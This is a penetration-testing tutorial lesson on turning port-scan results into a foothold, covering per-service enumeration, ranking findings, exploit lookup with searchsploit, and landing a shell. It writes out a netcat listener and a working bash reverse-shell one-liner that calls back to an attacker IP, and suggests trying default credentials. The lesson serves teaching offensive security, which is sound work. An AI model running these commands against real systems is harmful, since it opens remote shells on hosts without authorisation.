You finished phase 1 and you have a scan full of open ports. A pile of findings
is not a foothold. This lesson is about the bridge: how to interrogate each
service, decide what is worth chasing, and turn one weak spot into a shell.

## Enumerate each service on its own terms

An open port is a door. What you do next depends entirely on what is behind it.
Take every port your scan reported and ask the questions that service answers to.

- **80 / 443 (HTTP).** Read the page source. Fingerprint the tech. Brute-force
  directories and virtual hosts. Web is the most common foothold, so spend time
  here.
- **22 (SSH).** Rarely the way in by itself, but note the version and hold any
  usernames you find for a later credential attempt.
- **445 (SMB).** List shares as a null or guest user. Anonymous shares leak
  configs, backups, and credentials constantly.
- **3306 / 5432 (databases).** Try default and reused credentials. A readable
  database often holds password hashes.

## Prioritize: what actually gives a shell

Not every finding is worth your time. Rank them by how directly they lead to
code execution. A file-upload form that accepts a `.php` file outranks a
cosmetic version banner. A world-readable share with a config file outranks an
SSH port with no creds. Chase the finding that most plausibly ends in a shell,
and park the rest in your notes.

<Callout type="tip" title="Version numbers are leads, not answers">
When a service reports its exact version, search it against known exploits with
`searchsploit apache 2.4.49`. A match is a shortcut. No match just means the way
in is misconfiguration or credentials, not a public CVE.
</Callout>

## Land the shell

A foothold is the moment a service runs your command. The cleanest proof is a
reverse shell: you open a listener, then trick the target into connecting back
to you. Start the listener first, always, or the callback lands on nothing.

<CommandBlock
  title="attacker@kali"
  commands={[
    { cmd: "nc -lvnp 4444", comment: "listener running BEFORE you trigger the payload" },
    { cmd: "bash -c 'bash -i >& /dev/tcp/10.10.14.7/4444 0>&1'", comment: "the payload the target executes, pointing at your IP" },
  ]}
/>

<Callout type="security" title="Point the callback at yourself">
The IP in a reverse shell is yours, not the target's. On an engagement that is
your `tun0` VPN address, which you can read with `ip addr show tun0`. Get this
backwards and you will wait forever for a shell that never comes.
</Callout>
